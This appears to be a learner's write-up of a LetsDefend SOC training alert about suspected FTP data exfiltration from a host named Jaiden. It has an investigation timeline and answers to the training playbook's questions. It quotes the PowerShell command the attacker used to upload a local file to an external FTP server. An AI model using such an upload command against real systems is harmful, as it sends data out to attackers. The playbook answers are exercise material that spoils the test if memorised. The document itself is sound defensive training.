@@ -1,0 +1,78 @@
+🚨 Alert 
+** SEVERITY: HIGH** | **STATUS: TRUE POSITIVE** | **TARGET: `Jaiden` (`172.16.17.237`)**
+
+
+
+
+
+                                                        ## 🟢 Overview & Metadata
+
+
+
+
+EventID : 271
+Event Time : 2024-06-25T07:15:37+03:00
+Rule : SOC295 - Potential Data Exfiltration Detected via FTP
+Role : Incident Responder
+Alert Type : Data Leakage
+Difficulty : Hard
+MITRE ATT&CK : T1078 T1133 T1059.001 T1110 T1083 T1005 T1020
+L1 Note : I couldn't determine the reason for the command. However, I observed Brute Force attempts towards the system from the IP "169.150.218.3" just minutes before the alert triggered.
+Hostname : Jaiden
+Source IP : 172.16.17.237
+Alert Trigger Reason : An unusual file upload activity was detected. A PowerShell script was used to create and upload a file to an external FTP server.
+Alert Trigger Command : $webClient.UploadFile($ftpUrl, "STOR", $localFilePath)
+
+
+
+
+
+
+                                                        ## 🔍 Step-by-Step Investigation Timeline
+
+
+-Phase 1: There was suspicious brute force so we will check the logs to confirm the attacker IP. We can confirm the successfull login.
+
+
+-Phase 2: Proceed to contain the machine. 
+
+
+-Phase 3: Check the commands executed. He did reconnaissance. 
+
+
+-Phase 4: The attacker opens a shell to the IP 159.69.223.221 to the port 21. So there was a connection to the attacker IP on the protocol ftp through victim's powershell process.
+
+
+-Phase 5: In the commands executed we see a ping to eu-central-1.sftpcloud.io so probably that was another channel he used to exfiltrate data.
+
+
+
+
+
+                                                        ## 📋 Let's Defend Playbook Resolution
+
+
+
+
+    -Question 1: Have you seen any suspicious user or process activity that may be related to data collection?
+Yes, data from local system
+
+
+    -Question 2: Which MITRE technique was used in this incident?
+None
+
+
+    -Question 3: Have you observed any unusual outbound network traffic that may be related to data exfiltration?
+  Transfer data to cloud account
+
+
+    -Question 4: Determine the type of activity
+True Positive
+
+
+    -Question 5: Does the device need to be isolated?
+Yes
+
+
+
+Correction: In question number 3 the correct answer is Automated Exfltration as it says the attacker executes $webClient.UploadFile($ftpUrl, "STOR", $localFilePath).
